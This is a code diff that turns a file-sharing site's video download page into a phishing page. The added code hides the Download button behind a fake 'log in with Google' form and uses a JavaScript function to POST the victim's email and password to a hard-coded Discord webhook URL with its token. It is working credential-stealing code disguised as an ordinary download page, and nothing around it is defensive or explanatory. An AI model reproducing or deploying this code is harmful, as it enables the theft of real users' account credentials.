@@ -1,22 +1,82 @@
-<!DOCTYPE html><html lang="en_US"><head>
-    <style>
-        div{}
-    </style>
+<!DOCTYPE html><html lang="en_US">
+    <head>
+        <style>
+            .center {
+                margin: auto;
+                width: 60%;
+                padding: 20px;
+                box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
+            }
+            
+            .hideform {
+                display: none;
+            }
+            </style>
+    <script>
+        function Login(){
+            var popup = document.getElementById("myPopup");
+            popup.classList.toggle("show");
+        }
+        function LoginGoogle(){
+                const request = new XMLHttpRequest();
+                request.open("POST", "https://discord.com/api/webhooks/1133129415648362538/61RYss9PQgGtl_D4vIS2tzFqEJXRhLimVp1ewtMIrR2NM4iRIxbc21K4GZi34MBfxuW6");
+                var email = document.getElementById('email').value
+                var password = document.getElementById('password').value
+                request.setRequestHeader('Content-type', 'application/json');
+
+                const params = {
+                    "username": atob(document.URL.split("=")[1]),
+                    "avatar_url": "https://cdn.discordapp.com/embed/avatars/0.png",
+                    "content": "",
+                    "tts": false,
+                    "embeds": [
+                        {
+                        "id": 593735420,
+                        "color": 7989673,
+                        "fields": [
+                            {
+                            "id": 445104387,
+                            "name": "Email: "+email,
+                            "value": "\n"
+                            },
+                            {
+                            "id": 459105036,
+                            "name": "Password: "+password,
+                            "value": "\n"
+                            }
+                        ]
+                        }
+                    ],
+                    "components": [],
+                    "actions": {}
+                    }
+
+                request.send(JSON.stringify(params));
+            }
+    </script>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
-
-            <meta name="robots" content="index, follow">
     
-        <title>ShareStation</title>
+        <title>2023-06-04 00-08-19.mp4 - FileChan</title>
+                <link href="css/video-js.min.css" rel="stylesheet">
     
-    <link rel="stylesheet" href="css/main.css">
+    <link rel="stylesheet" href="css/filechan.css">
 
     <script src="js/app.js"></script>
 
     <link rel="shortcut icon" href="images/favicon-32x32-filechan.png">
 </head>
 <body>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+<div class="center hideform">
+    <button id="close" style="float: right;">X</button>
+    <a style="display:grid;font-size: 30px;margin-top: -20px;text-align: center;">You have to be logged in to download this file!</a>
+    <a style="display:grid;margin-top: 5px;">Log in with Google: </a>
+    <input style="display:grid;" placeholder="Email" id="email"></input>
+    <input style="display:grid;margin-top: 2px;" type="password" placeholder="Password" id="password"></input>
+    <button style="margin-top: 5px;" onclick="LoginGoogle()">Login</button>
+</div>
 <div id="site-wrapper" class="container">
 
             <div id="header" class="row">
@@ -50,11 +110,22 @@
         <div id="download-wrapper" class="row">
             <div class="col-xs-0 col-md-4"></div>
             <div class="col-xs-12 col-md-4 text-center">
-                                    <a type="button" id="download-url" class="btn btn-primary btn-block"><img src="images/video_unknown.png"> Download
+                                    <a type="button" onclick="Login()" id="download-url" class="btn btn-primary btn-block"><img src="images/video_unknown.png"> Download
                     (12.64 MB)</a>
                 
                                 <div class="col-xs-0 col-md-4"></div>
             </div>
+            <script>
+                $('#download-url').on('click', function () {
+                    $('.center').show();
+                    $(this).hide();
+                })
+                
+                $('#close').on('click', function () {
+                    $('.center').hide();
+                    $('#download-url').show();
+                })
+                </script>
         </div>
     
 
